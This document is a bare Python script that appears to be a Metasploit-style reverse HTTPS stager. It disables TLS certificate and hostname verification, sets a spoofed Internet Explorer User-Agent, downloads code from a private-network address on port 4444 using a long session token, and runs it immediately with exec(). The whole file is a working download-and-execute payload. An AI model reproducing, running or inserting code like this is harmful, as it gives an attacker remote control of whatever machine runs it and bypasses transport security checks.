import sys
vi=sys.version_info
ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener','HTTPSHandler'])
hs=[]
if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):
	import ssl
	sc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)
	sc.check_hostname=False
	sc.verify_mode=ssl.CERT_NONE
	hs.append(ul.HTTPSHandler(0,sc))
o=ul.build_opener(*hs)
o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
exec(o.open('https://192.168.20.131:4444/RfJZ5QeHO35_X2pLIbRPFgYv_S-h8MarXNqM3kqKtc5IovgeAnRUe8d75pkZ7OhmF7mncJPENEsPE3NpSU07d3sqLEIzv-oGlNJSVu8VqsV_OS4OktO5Gr34jUe7MXaq_OomrA2pMY0Py-0o_p1_t2Y0Deb7-NcwwxBqQMHA5gP_6GtqC9bgGA4axWHmB2YZdPIA3QLWAKt1XdSuCv9Ssttv8QM6b3k80SJnlNTmFCmpCzGhIJH7VfoRWCaN').read())